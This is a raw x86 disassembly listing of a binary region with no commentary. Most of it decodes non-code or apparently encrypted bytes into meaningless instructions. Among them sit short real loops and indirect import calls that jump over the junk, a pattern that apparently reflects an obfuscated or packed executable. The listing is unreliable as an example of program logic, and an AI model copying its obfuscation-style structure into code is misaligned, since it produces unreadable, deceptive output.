  4020e4:	loopne 0x40206d
  4020e6:	test   eax,0x7e058456
  4020eb:	jle    0x402142
  4020ed:	jg     0x40216d
  4020ef:	jle    0x402123
  4020f1:	arpl   WORD PTR [eax],bx
  4020f3:	mov    ah,0xcc
  4020f5:	pushf  
  4020f6:	scas   eax,DWORD PTR es:[edi]
  4020f7:	cld    
  4020f8:	dec    edi
  4020f9:	pop    ebp
  4020fa:	outs   dx,BYTE PTR ds:[esi]
  4020fb:	cdq    
  4020fc:	or     BYTE PTR [ecx],dl
  4020fe:	mov    ah,0xf6
  402100:	sub    esi,ebx
  402102:	mov    bh,0x65
  402104:	mov    ch,0xb9
  402106:	sub    al,0xf6
  402108:	jns    0x4020d9
  40210a:	lahf   
  40210b:	imul   DWORD PTR [edi]
  40210d:	js     0x402188
  40210f:	out    0x70,al
  402111:	shr    BYTE PTR [ecx+ecx*8],0x6d
  402115:	into   
  402116:	cdq    
  402117:	xor    BYTE PTR [esi],dl
  402119:	mov    edx,0x22c4c6f3
  40211e:	fwait
  40211f:	and    eax,0x4ca811cc
  402124:	fnstcw WORD PTR [ebp-0x6f]
  402127:	nop
  402128:	xor    BYTE PTR [edi+eiz*2-0x74044ead],bl
  40212f:	push   0x941d4248
  402134:	inc    eax
  402135:	iret   
  402136:	aas    
  402137:	dec    eax
  402138:	in     al,dx
  402139:	test   al,0x47
  40213b:	fsub   QWORD PTR ss:[edx]
  40213e:	adc    BYTE PTR [ecx+0xc],bh
  402141:	cs mov edi,0xeb327135
  402147:	jge    0x402164
  402149:	adc    al,0x83
  40214b:	test   BYTE PTR ds:0xbb5c537b,ch
  402151:	int3   
  402152:	inc    esp
  402153:	xor    ebp,eax
  402155:	pop    ss
  402156:	imul   esp,DWORD PTR [ebx+0x9],0xffffffde
  40215a:	out    dx,al
  40215b:	call   FWORD PTR [esp+esi*8-0x9]
  40215f:	fcom   QWORD PTR [ecx+0xf]
  402162:	addr16 sub eax,0x222b03af
  402168:	ins    BYTE PTR es:[edi],dx
  402169:	cmp    bl,BYTE PTR [ecx+0x4010aafa]
  40216f:	bound  ebp,QWORD PTR [edx]
  402171:	dec    DWORD PTR [eax+ecx*4-0x25]
  402175:	cdq    
  402176:	loope  0x40215a
  402178:	(bad)  
  402179:	scas   eax,DWORD PTR es:[edi]
  40217a:	loop   0x402199
  40217c:	rcl    ah,1
  40217e:	pushf  
  40217f:	inc    eax
  402180:	add    al,0x3e
  402182:	jg     0x402125
  402184:	or     ah,BYTE PTR [esi]
  402186:	pop    edx
  402187:	cmc    
  402188:	mov    dl,0xfc
  40218a:	mov    bh,BYTE PTR [ebx-0x39]
  40218d:	ins    BYTE PTR es:[edi],dx
  40218e:	and    eax,0xde6560b1
  402193:	cmc    
  402194:	push   eax
  402195:	push   edi
  402196:	aad    0x8e
  402198:	push   0x3a780a62
  40219d:	retf   0xfeb9
  4021a0:	pop    esi
  4021a1:	dec    ebp
  4021a2:	push   edx
  4021a3:	and    esi,DWORD PTR ss:[ecx+0x4e]
  4021a7:	add    eax,0xf2bf7c74
  4021ac:	mov    dl,0x30
  4021ae:	xchg   edi,eax
  4021af:	test   BYTE PTR [edi+0x3c5b06f],bl
  4021b5:	push   ecx
  4021b6:	stos   BYTE PTR es:[edi],al
  4021b7:	pusha  
  4021b8:	ret    0x7fda
  4021bb:	sbb    DWORD PTR [esi-0x53258c03],esi
  4021c1:	add    DWORD PTR [esi+0x2ba90ef5],esi
  4021c7:	mov    al,ds:0x5a86e947
  4021cc:	rol    bh,1
  4021ce:	jle    0x4021c0
  4021d0:	cmp    DWORD PTR [ecx-0x79],ebx
  4021d3:	enter  0xfa87,0x10
  4021d7:	enter  0x7afe,0xa3
  4021db:	adc    BYTE PTR [edx+eax*4],0x5
  4021df:	sub    al,BYTE PTR [edx+0xc]
  4021e2:	xchg   esi,eax
  4021e3:	fcmovnbe st,st(6)
  4021e5:	cmp    DWORD PTR [ecx+0x22c161f0],edi
  4021eb:	ja     0x402204
  4021ed:	in     eax,0xc3
  4021ef:	sbb    edi,0x824821c4
  4021f5:	scas   al,BYTE PTR es:[edi]
  4021f6:	inc    ecx
  4021f7:	nop
  4021f8:	ins    BYTE PTR es:[edi],dx
  4021f9:	jmp    0x6f17:0x8c942f0a
  402200:	mov    esi,0x76d5ac12
  402205:	out    dx,eax
  402206:	clc    
  402207:	push   edx
  402208:	push   ds
  402209:	cmp    eax,0xfaecb2cb
  40220e:	ins    BYTE PTR es:[edi],dx
  40220f:	mov    eax,0xc9b22d3a
  402214:	test   al,0xa8
  402216:	dec    esi
  402217:	dec    edi
  402218:	lahf   
  402219:	sbb    eax,0xe477d247
  40221e:	sbb    eax,0xaebcf2a5
  402223:	cli    
  402224:	imul   ecx,DWORD PTR [edx],0xf5e992e2
  40222a:	pop    ss
  40222b:	ror    dh,0x10
  40222e:	lods   eax,DWORD PTR ds:[esi]
  40222f:	xchg   ebx,eax
  402230:	or     BYTE PTR [edi-0x1],bh
  402233:	stc    
  402234:	test   al,0x48
  402236:	adc    bh,BYTE PTR [esi]
  402238:	jno    0x4021d4
  40223a:	mov    BYTE PTR [edx],cl
  40223c:	cmp    eax,0x5499b46e
  402241:	call   0x3511:0x808cf5c7
  402248:	add    BYTE PTR [eax],dh
  40224a:	or     eax,0xf9cf2e50
  40224f:	jle    0x402216
  402251:	data16 test al,0xe9
  402254:	ins    BYTE PTR es:[edi],dx
  402255:	adc    DWORD PTR ds:0x890d2c8f,0xab9075f0
  40225f:	dec    esp
  402260:	sub    BYTE PTR [eax+0x111847f2],cl
  402266:	pop    es
  402267:	add    esi,DWORD PTR [esi-0x6d1bf4da]
  40226d:	pop    esp
  40226e:	xor    eax,DWORD PTR [edx-0x53]
  402271:	or     DWORD PTR [edi+ebx*8+0x277cba13],esp
  402278:	loope  0x4022b1
  40227a:	dec    ecx
  40227b:	add    al,0x1
  40227d:	out    dx,eax
  40227e:	pop    edx
  40227f:	add    al,0x45
  402281:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  402283:	daa    
  402284:	xor    BYTE PTR [ebx-0x38],dl
  402287:	pushf  
  402288:	pop    ss
  402289:	iret   
  40228a:	pop    ss
  40228b:	addr16 dec esi
  40228d:	sar    DWORD PTR [ebx-0x191878b8],1
  402293:	in     eax,dx
  402294:	(bad)  
  402295:	out    dx,eax
  402296:	push   edx
  402297:	addr16 jg 0x402272
  40229a:	push   eax
  40229b:	leave  
  40229c:	jno    0x40223d
  40229e:	mov    edi,0xbf01cf44
  4022a3:	hlt    
  4022a4:	mov    edx,ebp
  4022a6:	icebp  
  4022a7:	push   cs
  4022a8:	cdq    
  4022a9:	dec    eax
  4022aa:	mov    ds:0xc9bdb6d,al
  4022af:	cmp    DWORD PTR [eax],ecx
  4022b1:	inc    esi
  4022b2:	adc    esi,DWORD PTR [ebp+0x1875310f]
  4022b8:	mov    dh,0x67
  4022ba:	inc    esi
  4022bb:	retfw  0xbd1f
  4022bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022c0:	jb     0x402340
  4022c2:	mov    ds:0xaec19b3a,al
  4022c7:	pop    esp
  4022c8:	pop    ecx
  4022c9:	pop    esi
  4022ca:	cmp    edx,DWORD PTR [ecx-0x7f]
  4022cd:	and    eax,0x42ec6f
  4022d2:	add    BYTE PTR [eax],al
  4022d4:	add    BYTE PTR [eax],al
  4022d6:	mov    edx,DWORD PTR ds:0x42ec6f
  4022dc:	inc    edx
  4022dd:	mov    DWORD PTR ds:0x42ec6f,edx
  4022e3:	cmp    DWORD PTR ds:0x42ec6f,0x28
  4022ea:	jne    0x4022fe
  4022f0:	push   DWORD PTR [ebp-0x18]
  4022f3:	push   0x56d1
  4022f8:	call   DWORD PTR ds:0x42e83f
  4022fe:	cmp    DWORD PTR ds:0x42ec6f,0x19
  402305:	jb     0x4022d6
  40230b:	mov    DWORD PTR ds:0x4302c1,0x1f
  402315:	cmp    DWORD PTR ds:0x4302c1,0x0
  40231c:	je     0x402548
  402322:	cmp    DWORD PTR ds:0x4302c1,0x2c
  402329:	jne    0x40233a
  40232f:	push   0x7b19
  402334:	call   DWORD PTR ds:0x42e82f
  40233a:	xor    edx,edx
  40233c:	xor    edx,DWORD PTR ds:0x4302c1
  402342:	dec    edx
  402343:	mov    DWORD PTR ds:0x4302c1,edx
  402349:	jmp    0x402315
  40234e:	adc    eax,edx
  402350:	jmp    0x402548
  402355:	ds je  0x4022d9
  402358:	cdq    
  402359:	mov    cl,0x69
  40235b:	out    0x71,al
  40235d:	sub    al,0x9b
  40235f:	mov    cl,0x3a
  402361:	rcl    DWORD PTR [edi+0x3db02c3],1
  402367:	jle    0x4023e7
  402369:	push   ebp
  40236a:	jg     0x4023ea
  40236c:	jle    0x40238f
  40236e:	xchg   DWORD PTR [ecx+0x275ae67b],esp
  402374:	sub    eax,DWORD PTR [esi+0x40]
  402377:	scas   al,BYTE PTR es:[edi]
  402378:	test   eax,0x98e809d
  40237d:	sar    DWORD PTR [ebx+0x7c66f4ec],cl
  402383:	adc    eax,0xba7a616
  402388:	xchg   esi,eax
  402389:	ret    0x4ab2
  40238c:	pusha  
  40238d:	aad    0x52
  40238f:	pop    eax
  402390:	(bad)  
  402391:	jns    0x4023aa
  402393:	jg     0x4023fb
  402395:	push   ecx
  402396:	loop   0x40233e
  402398:	lahf   
  402399:	mov    ah,0x22
  40239b:	lock call 0x3717a445
  4023a1:	jecxz  0x4023f1
  4023a3:	fld    DWORD PTR [ebx]
  4023a5:	lds    ebx,FWORD PTR [esi-0x67]
  4023a8:	mov    eax,0xa75da190
  4023ad:	std    
  4023ae:	add    bl,cl
  4023b0:	rcr    BYTE PTR [eax-0x4030000a],cl
  4023b6:	cmp    edx,DWORD PTR [edi+0x3b]
  4023b9:	ror    DWORD PTR [ebx],cl
  4023bb:	jb     0x40238a
  4023bd:	int3   
  4023be:	jp     0x4023ac
  4023c0:	sbb    esp,0xc949b03f
  4023c6:	sub    bl,dh
  4023c8:	icebp  
  4023c9:	clc    
  4023ca:	fbld   TBYTE PTR [ebp+0x7ff98f3e]
  4023d0:	mov    ebx,0xd4ba40a6
  4023d5:	and    al,0x85
  4023d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023d8:	lods   eax,DWORD PTR ds:[esi]
  4023d9:	pusha  
  4023da:	mov    DWORD PTR [ebp+0x27337e6d],eax
  4023e0:	cmp    dl,ch
  4023e2:	sahf   
  4023e3:	mov    ds:0x5af10e9d,al
  4023e8:	hlt    
  4023e9:	add    cl,BYTE PTR [edx-0x25efe3a4]
  4023ef:	cli    
  4023f0:	mov    WORD PTR [ecx+ebx*4],?
  4023f3:	shl    esp,cl
  4023f5:	xor    DWORD PTR [ebp-0x4],esp
  4023f8:	je     0x4023b3
  4023fa:	(bad)  
  4023fb:	sbb    DWORD PTR [esi+0x5d],edi
  4023fe:	jae    0x40246d
  402400:	data16 stos BYTE PTR es:[edi],al
  402402:	cmp    cl,0x24
  402405:	mov    edx,0x6c850db2
  40240a:	mov    cl,0x25
  40240c:	enter  0x5b3b,0x94
  402410:	push   es
  402411:	jp     0x4023ce
  402413:	in     eax,dx
  402414:	pop    es
  402415:	mov    cl,0xa6
  402417:	jb     0x402470
  402419:	jbe    0x402421
  40241b:	pop    ebp
  40241c:	jmp    0x474c:0xa38ee1d
  402423:	push   esi
  402424:	sbb    ebx,DWORD PTR [esi-0x6b2d1e07]
  40242a:	jnp    0x402430
  40242c:	inc    ecx
  40242d:	xchg   ebp,eax
  40242e:	je     0x4023ce
  402430:	or     BYTE PTR [di-0x55],bl
  402434:	out    0x60,al
  402436:	ret    
  402437:	mov    edx,0x1b89b04
  40243c:	imul   edi,DWORD PTR [edx-0x16],0xffffffc0
  402440:	sbb    al,0x7c
  402442:	push   ebx
  402443:	sub    DWORD PTR [ebx+0x6b],ecx
  402446:	mov    edi,0x3976ba4e
  40244b:	xor    edi,edi
  40244d:	fisttp WORD PTR [ecx-0x555609fb]
  402453:	mov    bh,0xe2
  402455:	sub    al,BYTE PTR [ebx-0x624e4a7f]
  40245b:	push   edi
  40245c:	pop    edx
  40245d:	or     DWORD PTR [ebx+0x5d],ebp
  402460:	mov    ss,WORD PTR [edx-0x7aaff067]
  402466:	add    BYTE PTR [eax-0x54],0x83
  40246a:	push   esp
  40246b:	into   
  40246c:	sbb    BYTE PTR [esi],cl
  40246e:	adc    ebx,ecx
  402470:	push   esi
  402471:	adc    DWORD PTR [edx],0xfffffff3
  402474:	ja     0x402450
  402476:	ins    DWORD PTR es:[edi],dx
  402477:	nop
  402478:	das    
  402479:	loopne 0x4024ae
  40247b:	int    0x12
  40247d:	add    DWORD PTR [esi],eax
  40247f:	or     eax,0x4befc18d
  402484:	adc    dh,BYTE PTR [eax-0xf]
  402487:	mov    ds:0xe414fca3,eax
  40248c:	cmp    bh,0x5d
  40248f:	mov    edx,DWORD PTR [eax-0x79]
  402492:	and    bh,bh
  402494:	fdivr  DWORD PTR [ebx-0x7cfbe78a]
  40249a:	ins    BYTE PTR es:[edi],dx
  40249b:	leave  
  40249c:	or     eax,0x7e16773a
  4024a1:	jne    0x40245f
  4024a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024a4:	shufps xmm1,XMMWORD PTR [ebx],0xe3
  4024a8:	or     al,0xa
  4024aa:	jl     0x402523
  4024ac:	adc    BYTE PTR [ecx-0x43],0x5f
  4024b0:	xchg   ebx,eax
  4024b1:	mov    WORD PTR [ebx+0x30f41a91],gs
  4024b7:	add    dh,dh
  4024b9:	dec    esi
  4024ba:	gs xchg esp,eax
  4024bc:	in     eax,0x4f
  4024be:	loope  0x4024e6
  4024c0:	mov    cl,0x69
  4024c2:	mov    eax,ds:0xc5f2a895
  4024c7:	and    ch,BYTE PTR [edi]
  4024c9:	call   DWORD PTR [edi+0xf]
  4024cc:	test   al,0x3e
  4024ce:	in     eax,0x80
  4024d0:	cli    
  4024d1:	or     BYTE PTR [edx-0x42cc220d],bl
  4024d7:	loop   0x4024d1
  4024d9:	and    ebp,DWORD PTR [ecx+0x17]
  4024dc:	xchg   edx,eax
  4024dd:	or     eax,ecx
  4024df:	retf   0x7050
  4024e2:	xchg   edi,eax
  4024e3:	into   
  4024e4:	cwde   
  4024e5:	arpl   WORD PTR [ecx],ax
  4024e7:	inc    ebx
  4024e8:	test   ecx,0xeb60ea0e
  4024ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024ef:	and    eax,ecx
  4024f1:	push   ebx
  4024f2:	popa   
  4024f3:	adc    ebx,edi
  4024f5:	jns    0x4024e2
  4024f7:	xor    DWORD PTR [ecx+0x35c91ac2],ebp
  4024fd:	push   esi
  4024fe:	adc    ah,BYTE PTR [ebx-0x36906c0a]
  402504:	mov    ah,0xc6
  402506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402507:	or     ah,BYTE PTR [edx-0x61bbd21a]
  40250d:	lea    ebx,[ebx]
  40250f:	ins    DWORD PTR es:[edi],dx
  402510:	rol    DWORD PTR [esp+edx*4-0x93c06d0],cl
  402517:	xchg   ebx,eax
  402518:	mov    WORD PTR [edx-0x39],es
  40251b:	cmp    cl,BYTE PTR [edx-0x6f3bcdbf]
  402521:	push   edi
  402522:	add    al,0xfd
  402524:	pop    ebp
  402525:	adc    eax,0xb0e068d9
  40252a:	mov    edi,0x41f262b1
  40252f:	pmaddwd mm1,QWORD PTR [edx-0x59]
  402533:	ins    DWORD PTR es:[edi],dx
  402534:	push   ecx
  402535:	sbb    al,BYTE PTR [edx+0x78]
  402538:	and    esp,DWORD PTR [edi+0x5]
  40253b:	cmp    eax,0x1a78cb5
  402540:	xor    esi,edi
  402542:	lock iret 
  402544:	xchg   edi,eax
  402545:	and    al,0xd1
  402547:	clc    
  402548:	push   ecx
  402549:	and    DWORD PTR ds:0x42ec4b,0x3339
  402553:	mov    eax,0xf89c8531
  402558:	movzx  edx,WORD PTR ds:0x42ec73
  40255f:	xor    edx,DWORD PTR ds:0x42ec4f
  402565:	mov    DWORD PTR ds:0x42ec73,edx
  40256b:	mov    DWORD PTR [ebp-0x8],eax
  40256e:	xor    ecx,ecx
  402570:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  402577:	mov    edx,DWORD PTR [ebp-0x8]
  40257a:	add    DWORD PTR ds:0x4302e5,0x1aee
  402584:	push   esi
  402585:	mov    ecx,0x7510854
  40258a:	xor    esi,esi
  40258c:	or     esi,DWORD PTR ds:0x4302c5
  402592:	and    DWORD PTR ds:0x42ec57,esi
  402598:	xor    edx,ecx
  40259a:	and    DWORD PTR ds:0x43034f,0x0
  4025a4:	jmp    0x4025b8
  4025a9:	xor    esi,esi
  4025ab:	xor    esi,DWORD PTR ds:0x43034f
  4025b1:	inc    esi
  4025b2:	mov    DWORD PTR ds:0x43034f,esi
  4025b8:	cmp    DWORD PTR ds:0x43034f,0x10
  4025bf:	jae    0x4025fc
  4025c5:	cmp    DWORD PTR ds:0x43034f,0x9
  4025cc:	jne    0x4025dd
  4025d2:	push   0x42e6c6
  4025d7:	call   DWORD PTR ds:0x42e843
  4025dd:	cmp    DWORD PTR ds:0x43034f,0x8
  4025e4:	jne    0x4025f7
  4025ea:	mov    esi,DWORD PTR ds:0x43034f
  4025f0:	inc    esi
  4025f1:	mov    DWORD PTR ds:0x43034f,esi
  4025f7:	jmp    0x4025a9
  4025fc:	mov    esi,0x32729b
  402601:	jmp    0x4027f9
  402606:	lock and ch,BYTE PTR [esi+eax*1-0xf8f6f94]
  40260e:	xchg   edi,eax
  40260f:	aaa    
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	fs push esp
  402613:	xor    edi,edx
  402615:	adc    bh,BYTE PTR [esi]
  402617:	add    DWORD PTR [esi+0x7e],edi
  40261a:	push   ebp
  40261b:	jg     0x40269b
  40261d:	jle    0x40263d
  40261f:	add    al,0x38
  402621:	sbb    esp,DWORD PTR [esi+0x67]
  402624:	int    0x27
  402626:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402627:	sub    al,0xc9
  402629:	mov    dl,0x55
  40262b:	jo     0x40269c
  40262d:	int3   
  40262e:	sub    al,0xb6
  402630:	lea    esp,[ecx]
  402632:	push   cs
  402633:	and    ecx,DWORD PTR [esi+0x2b]
  402636:	and    DWORD PTR [esi+0x6c],ecx
  402639:	or     DWORD PTR [eax],esi
  40263b:	jge    0x402600
  40263d:	mov    DWORD PTR [eax+ebp*8],0x7fb6292e
  402644:	retf   0x8fa
  402647:	xor    BYTE PTR [esp+ecx*2-0x64],dl
  40264b:	jmp    0xed105c3
  402650:	xchg   esi,edi
  402652:	pop    edi
  402653:	xor    esp,DWORD PTR [edi-0x79185a09]
  402659:	push   eax
  40265a:	sar    DWORD PTR ds:0x8d5006e7,cl
  402660:	addr16 jns 0x402610
  402663:	add    DWORD PTR [edx],ebp
  402665:	ss or  ch,al
  402668:	jae    0x40267d
  40266a:	cmp    al,cl
  40266c:	xchg   BYTE PTR [ecx+0x7aa83ea2],bh
  402672:	pop    ecx
  402673:	pop    ebx
  402674:	xchg   esi,eax
  402675:	stc    
  402676:	ret    
  402677:	shl    DWORD PTR [eax+edx*1+0x28930d79],0x86
  40267f:	cmp    ah,ch
  402681:	xchg   ebx,eax
  402682:	mov    bl,0xed
  402684:	jmp    0x4026ee
  402686:	mov    cl,BYTE PTR [edx+0x52]
  402689:	gs pop es
  40268b:	adc    ecx,DWORD PTR [ebx-0x32f69d5a]
  402691:	push   0x3aefafb
  402696:	inc    edi
  402697:	or     eax,0xbe4cd7c9
  40269c:	xor    ebx,edx
  40269e:	and    DWORD PTR [eax],edx
  4026a0:	add    eax,0x9cd21ddc
  4026a5:	mov    cl,0xe3
  4026a7:	xchg   DWORD PTR [ebp+0x7e],esp
  4026aa:	xor    DWORD PTR [ecx-0x65],eax
  4026ad:	fnstenv [ecx+0x542b02c6]
  4026b3:	lds    edx,FWORD PTR [ebp-0x3a]
  4026b6:	and    al,BYTE PTR [ecx]
  4026b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026b9:	push   ecx
  4026ba:	push   cs
  4026bb:	xchg   ebx,eax
  4026bc:	test   ch,bh
  4026be:	test   DWORD PTR [ebx+eax*2+0x5],esi
  4026c2:	clc    
  4026c3:	ds daa 
  4026c5:	sti    
  4026c6:	stc    
  4026c7:	pop    ss
  4026c8:	iret   
  4026c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026ca:	(bad)  
  4026cb:	aad    0xfa
  4026cd:	loopne 0x40271e
  4026cf:	cmp    al,ah
  4026d1:	or     esp,DWORD PTR [esi+0x6b964032]
  4026d7:	inc    edi
  4026d8:	mov    ds:0x583383dc,eax
  4026dd:	sar    BYTE PTR [edx-0x7f],1
  4026e0:	mov    al,ds:0xb00a4699
  4026e5:	cmp    BYTE PTR es:[ebp-0x12d9e6aa],bh
  4026ec:	mov    dl,0x31
  4026ee:	cmp    esp,DWORD PTR [edi]
  4026f0:	seto   BYTE PTR [edi+0x31de2bac]
  4026f7:	sbb    al,0xf3
  4026f9:	or     al,0x6e
  4026fb:	test   al,0x18
  4026fd:	jo     0x40273d
  4026ff:	push   cs
  402700:	std    
  402701:	imul   ecx,eax,0x140b8e78
  402707:	or     esi,DWORD PTR [edi-0x8]
  40270a:	adc    ah,BYTE PTR [esi-0x74]
  40270d:	pop    esp
  40270e:	(bad)  [edx+0x488781ef]
  402714:	js     0x4026e6
  402716:	inc    BYTE PTR [ebx-0x6a964b25]
  40271c:	mov    esp,0x39cabe8
  402721:	cmp    al,bh
  402723:	lods   eax,DWORD PTR ds:[esi]
  402724:	xor    esi,DWORD PTR [edi+0x5bf00bee]
  40272a:	dec    ebx
  40272b:	adc    esp,DWORD PTR [ebx-0x335c85cd]
  402731:	out    dx,eax
  402732:	stos   BYTE PTR es:[edi],al
  402733:	hlt    
  402734:	mov    bl,0x52
  402736:	cli    
  402737:	push   0xc
  402739:	rcl    BYTE PTR [esi+0x122a1d26],0xe9
  402740:	mov    ?,WORD PTR [esp+eax*1+0x38]
  402744:	scas   eax,DWORD PTR es:[edi]
  402745:	jle    0x40271c
  402747:	sub    DWORD PTR [ebp-0x5baae462],0x1485fe02
  402751:	jno    0x40273b
  402753:	fwait
  402754:	dec    edx
  402755:	fimul  DWORD PTR [ebx+0x5b]
  402758:	popa   
  402759:	push   eax
  40275b:	xchg   ebp,eax
  40275c:	mov    esp,0xe356c8e3
  402761:	out    dx,eax
  402762:	lahf   
  402763:	pop    ebp
  402764:	and    BYTE PTR [ebx+0x77],ch
  402767:	js     0x4027a1
  402769:	stc    
  40276a:	loope  0x40275d
  40276c:	xchg   ecx,eax
  40276d:	push   edx
  40276e:	es loope 0x4027db
  402771:	adc    ecx,esi
  402773:	adc    DWORD PTR [ebx+0xc3832aa],edx
  402779:	out    0x5f,eax
  40277b:	nop
  40277c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40277d:	(bad)  
  40277e:	in     eax,dx
  40277f:	add    BYTE PTR [ecx+edi*1-0x7a],0x91
  402784:	jne    0x4027f9
  402786:	mov    dl,0x52
  402788:	mov    ah,0x2
  40278a:	mov    gs,ecx
  40278c:	inc    esi
  40278d:	xchg   edi,eax
  40278e:	add    eax,0x25dbc483
  402793:	out    dx,al
  402794:	xchg   edx,eax
  402795:	push   eax
  402796:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402797:	jbe    0x402807
  402799:	xchg   esi,eax
  40279a:	dec    ebx
  40279b:	in     al,dx
  40279c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40279d:	mov    al,0xea
  40279f:	add    ecx,DWORD PTR [edx+0x35]
  4027a2:	inc    esi
  4027a3:	je     0x402768
  4027a5:	test   al,0x3c
  4027a7:	and    eax,0x4ec77354
  4027ac:	fcomi  st,st(6)
  4027ae:	scas   eax,DWORD PTR es:[edi]
  4027af:	mov    cl,0xbc
  4027b1:	push   es
  4027b2:	adc    ebx,DWORD PTR gs:[ebx-0x243341b2]
  4027b9:	mov    esp,0x2a943991
  4027be:	ins    DWORD PTR es:[edi],dx
  4027bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027c0:	jg     0x40277b
  4027c2:	(bad)  
  4027c3:	or     ebx,DWORD PTR [eax-0x5441756d]
  4027c9:	ds out dx,eax
  4027cb:	jp     0x402828
  4027cd:	cs mov dl,0xcb
  4027d0:	jnp    0x402839
  4027d2:	adc    al,0xd9
  4027d4:	in     eax,0xbd
  4027d6:	fnstsw WORD PTR [ebp+0x2f2875eb]
  4027dc:	psllq  mm3,QWORD PTR [ebp+0x57]
  4027e0:	ret    0x2c46
  4027e3:	mov    eax,fs
  4027e5:	inc    esi
  4027e6:	mov    ebx,0x324ee0e6
  4027eb:	stos   DWORD PTR es:[edi],eax
  4027ec:	and    eax,0x7be9dd8b
  4027f1:	cmp    BYTE PTR [ecx+0x57cef64d],dh
  4027f7:	mov    al,0x79
  4027f9:	push   edi
  4027fa:	mov    edi,DWORD PTR [ebp+0x10]
  4027fd:	add    edx,esi
  4027ff:	cmp    edi,edx
  402801:	je     0x402e62
  402807:	mov    edx,DWORD PTR [ebp-0x8]
  40280a:	mov    eax,DWORD PTR [ebp-0x4]
  40280d:	xor    eax,ecx
  40280f:	mov    edi,0xffcd8d65
  402814:	sub    edi,eax
  402816:	jmp    0x402a0e
  40281b:	ins    BYTE PTR es:[edi],dx
  40281c:	cmp    al,0x55
  40281e:	arpl   WORD PTR [ebp+0x73],si
  402821:	push   0x2ad4f5d1
  402826:	xor    DWORD PTR [ebx],edi
  402828:	popf   
  402829:	push   cs
  40282a:	ss adc eax,0x557e7e0f
  402830:	jg     0x4028b0
  402832:	jle    0x4027f2
  402834:	xchg   DWORD PTR [edi],edx
  402836:	hlt    
  402837:	mov    ebx,0xfd0c57bc
  40283c:	and    al,ch
  40283e:	mov    ds,WORD PTR [eax+0xa]
  402841:	or     DWORD PTR [ebx-0x77eaeaae],edx
  402847:	mov    al,0x51
  402849:	in     eax,0xeb
  40284b:	aas    
  40284c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40284d:	scas   al,BYTE PTR es:[edi]
  40284e:	pop    esp
  40284f:	clc    
  402850:	sbb    BYTE PTR ds:0x6bc66103,bh
  402856:	mov    cl,0x2e
  402858:	stos   DWORD PTR es:[edi],eax
  402859:	pop    esp
  40285a:	mov    al,0x7b
  40285c:	std    
  40285d:	test   edi,0x2a7ee8c
  402863:	or     al,BYTE PTR [eax]
  402865:	out    0x90,al
  402867:	lea    esi,[eax-0x12f15cb]
  40286d:	imul   DWORD PTR [edx+0x3e]
  402870:	hlt    
  402871:	fstp   TBYTE PTR [ebx-0x52]
  402874:	pop    eax
  402875:	mov    al,ds:0x9577b607
  40287a:	dec    edi
  40287b:	das    
  40287c:	mov    ebx,0x23956b52
  402881:	pop    edi
  402882:	ret    
  402883:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402884:	cdq    
  402885:	sub    DWORD PTR [edx-0x69a9c948],ecx
  40288b:	lods   eax,DWORD PTR ds:[esi]
  40288c:	dec    ecx
  40288d:	sbb    DWORD PTR ds:0x5fb55bcc,0x39dccbe5
  402897:	ret    
  402898:	jns    0x402822
  40289a:	dec    ecx
  40289b:	and    eax,0xdf68b538
  4028a0:	adc    BYTE PTR [esi-0x6a9b4e45],dh
  4028a6:	test   BYTE PTR fs:[ecx-0x25],bl
  4028aa:	adc    al,0x8b
  4028ac:	cmp    BYTE PTR [edx+ecx*2-0x20],0x78
  4028b1:	stos   BYTE PTR es:[edi],al
  4028b2:	pushf  
  4028b3:	repz cmp BYTE PTR [edi-0x1bfe2a3c],ch
  4028ba:	out    dx,al
  4028bb:	add    al,0xcc
  4028bd:	inc    di
  4028bf:	dec    eax
  4028c0:	hlt    
  4028c1:	es xchg ecx,eax
  4028c3:	inc    ebx
  4028c4:	(bad)  
  4028c5:	(bad)  
  4028c6:	mov    edi,0xb6127487
  4028cb:	(bad)  
  4028cc:	jmp    0x864d:0xeefb5edf
  4028d3:	ret    0x39f5
  4028d6:	push   ebp
  4028d7:	pushw  es
  4028d9:	jl     0x4028e1
  4028db:	xor    DWORD PTR [ebp+0x73],ebx
  4028de:	out    dx,eax
  4028df:	out    dx,eax
  4028e0:	retf   
  4028e1:	aam    0xbe
  4028e3:	(bad)  
  4028e4:	fcom   DWORD PTR [edi]
  4028e6:	(bad)  
  4028e7:	cmp    eax,0x38ca32ae
  4028ec:	push   0x1be6d3c9
  4028f1:	in     al,dx
  4028f2:	add    DWORD PTR [edx+0x64],ebx
  4028f5:	pop    ebp
  4028f6:	push   es
  4028f7:	jb     0x40293a
  4028f9:	ret    
  4028fa:	mov    ds:0x71b5a0f5,al
  4028ff:	inc    edi
  402900:	push   ecx
  402901:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402902:	cdq    
  402903:	outs   dx,BYTE PTR ds:[esi]
  402904:	fstp   QWORD PTR [edi-0x6f]
  402907:	mov    edx,eax
  402909:	jmp    0x4028d9
  40290b:	add    cl,BYTE PTR [esi+0x618ddd1]
  402911:	es or  al,0x86
  402914:	clc    
  402915:	jns    0x402949
  402917:	(bad)  
  402918:	call   0x73743952
  40291d:	cmp    eax,0xfe1c9beb
  402922:	xchg   dl,cl
  402924:	mul    BYTE PTR [ecx+0xfc074da]
  40292a:	nop
  40292b:	adc    edi,0x38
  40292e:	jo     0x4028ee
  402930:	mov    al,bh
  402932:	int    0x4
  402934:	xor    eax,0x1b175545
  402939:	and    DWORD PTR [edi],edi
  40293b:	mov    BYTE PTR [edx],dh
  40293d:	add    eax,DWORD PTR [edi+0x46]
